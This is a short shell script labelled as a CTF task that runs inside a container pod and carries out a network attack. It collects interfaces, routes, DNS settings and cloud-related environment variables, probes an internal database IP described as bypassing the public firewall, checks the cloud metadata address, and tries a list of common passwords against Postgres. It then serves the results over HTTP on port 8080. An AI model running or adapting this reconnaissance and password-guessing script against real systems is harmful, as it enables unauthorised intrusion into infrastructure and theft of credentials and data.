#!/bin/sh
# CTF falcon — pod net position + internal IP (alpine-safe), HTTP served on 8080
{
  echo "=== POD NET POSITION ==="
  echo "--- interfaces ---"
  ifconfig 2>/dev/null || busybox ifconfig 2>/dev/null || cat /proc/net/if_inet6 /proc/net/route 2>/dev/null | head
  echo "--- default route ---"
  cat /proc/net/route 2>/dev/null | head -5
  echo "--- dns ---"
  cat /etc/resolv.conf 2>/dev/null
  echo "--- env (Aiven-ish) ---"
  env | grep -iE "aiven|region|vpc|zone|cluster|pod" | head
  echo
  echo "=== internal IP 10.1.47.111 (bypass public FW) ==="
  for p in 5432 12691; do
    if (echo > /dev/tcp/10.1.47.111/$p) 2>/dev/null; then echo "10.1.47.111:$p OPEN"; else echo "10.1.47.111:$p closed/timeout"; fi
  done
  echo "=== public IP 132.145.163.127:12691 ==="
  if timeout 4 sh -c '(echo > /dev/tcp/132.145.163.127/12691)' 2>/dev/null; then echo "pub:12691 OPEN"; else echo "pub:12691 closed/timeout"; fi
  echo
  echo "=== Aiven internal hosts ==="
  for h in api.aiven.io mcp.aiven.live console.aiven.io 169.254.169.254; do
    getent hosts $h >/dev/null 2>&1 && echo "$h resolves: $(getent hosts $h | awk '{print $1}' | head -1)" || echo "$h NX"
  done
  echo "=== PG on internal IP (common pw) ==="
  for pw in falcon aiven password postgres dev-sandbox sandbox "812de5da-0bab-4990-90e8-57303eebfd30"; do
    if PGPASSWORD=*** timeout 4 psql -h 10.1.47.111 -p 12691 -U falcon -d postgres -c "select 1" 2>/dev/null | grep -q "1"; then
      echo "INTERNAL HIT pw=$pw"; break
    fi
  done
  echo "=== END ==="
} > /app/ctf.txt 2>&1

# serve forever
python3 -m http.server 8080 --directory /app